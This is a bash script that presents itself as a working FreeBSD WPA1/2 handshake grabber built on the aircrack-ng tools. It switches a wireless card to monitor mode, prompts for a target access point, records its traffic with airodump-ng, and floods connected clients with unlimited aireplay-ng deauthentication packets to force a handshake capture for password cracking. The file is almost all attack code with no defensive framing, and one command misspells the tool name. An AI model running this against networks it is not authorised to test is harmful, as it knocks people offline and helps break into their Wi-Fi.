#!/bin/bash
#Freebsd WPA1/2 Handshake Grabber Concept (Working)
###Functions
#this will display a banner
f_banner(){
	echo "LOGO HERE "#LOGO HERE
	echo " "
}
#this check is the script is running with root/sudo priv
f_rootcheck(){
if [ $(id -u) -gt 0 ];then
        echo "This script requires ROOT or SUDO privileges"
        exit
fi
}
#this turns the networking on for freebsd
f_netifon(){
	service netif start
}
#this turns the networking off for freebsd
f_netifoff(){
	service netif stop
}
#this filters ifconfig output and set the phsyical adaptor
f_wlans(){
	wlansdevices=`ifconfig | awk '{print $1}' | grep wlan | sed 's/:/ /g'`
	echo $wlansdevices
	printf "Please select a interface> "
	read -r wlandev
	parent_interface=`ifconfig | grep -A 10 $wlandev | grep parent | awk '{print $3}'`
}
#this sets the selected adaptor to monitor mode
f_airmonon(){
	printf "Placing $wlandev into monitoring mode"
	airmon-ng start $parent_interface
	printf "$wlandev is now in monitor mode"
}
#this disables monitor mod
f_airmonoff(){
	printf "Disabling monitor mode."
	airmon-ng stop $parent_interface
}
#this will display all seeable WAP and allow you to set which to attack
f_airodump_bssid(){
	airodump-ng $wlandev
	printf "Enter BSSID to attack> "
	read -r bssid
	printf "Enter CHANNELto attack> "
	read -r bssidchan
	printf "Enter ESSID to attack> "
	read -r essid
}
f_airodump_station(){
	airdump-ng -c$bssidchan -d $bssid $wlandev
	printf "Enter STATION to deauth> "
	read -r station
}
#this will set airodump to capture data from target
f_targetcapture(){
	airodump-ng -c$bssidchan -w $essid.capture -d $bssid $wlandev
}
#this will perform a deauth attack on workstations connected to target wifi
f_aireplay(){
	xterm -e bash -c "sudo aireplay-ng --deauth 0 -a $bssid $wlandev"
}
#this is a combined function of f_targetcapture and f_aireplay
f_airattack(){
	echo "Launching WPA Handshake Deauth Attack"
	xterm -e bash -c "sudo airodump-ng -c$bssidchan -w $essid -d $bssid $wlandev" &
	sleep 1
	xterm -e bash -c "sudo aireplay-ng --deauth 0 -a $bssid $wlandev" 
}

##Testing Area
f_wlans
f_airmonon
f_airodump_bssid
f_airattack
f_airmonoff
